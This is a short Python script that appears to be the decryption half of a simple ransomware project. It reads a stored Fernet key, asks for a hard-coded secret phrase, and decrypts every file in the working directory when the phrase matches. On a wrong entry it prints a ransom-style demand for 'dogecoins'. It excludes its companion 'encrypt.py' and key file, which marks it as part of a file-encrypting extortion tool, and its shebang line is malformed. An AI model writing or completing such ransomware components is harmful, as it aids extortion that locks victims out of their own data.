#!/usr/bin.env python3

import os
from cryptography.fernet import Fernet

# Let's find some files

files = []

for file in os.listdir():
	if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()

secretphrase = "coffee"
user_phrase = input("Enter the secret phrase to decrypt all your files\n ")

if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as testfile:
			content = testfile.read()
		content_decrypted = Fernet(secretkey).decrypt(content)
		with open(file, "wb") as testfile:
			testfile.write (content_decrypted)
	print("Congrats, your files have been decrypted, Enjoy...")

else:
	print("Wrong Secret Phrase. send more dogecoins...")
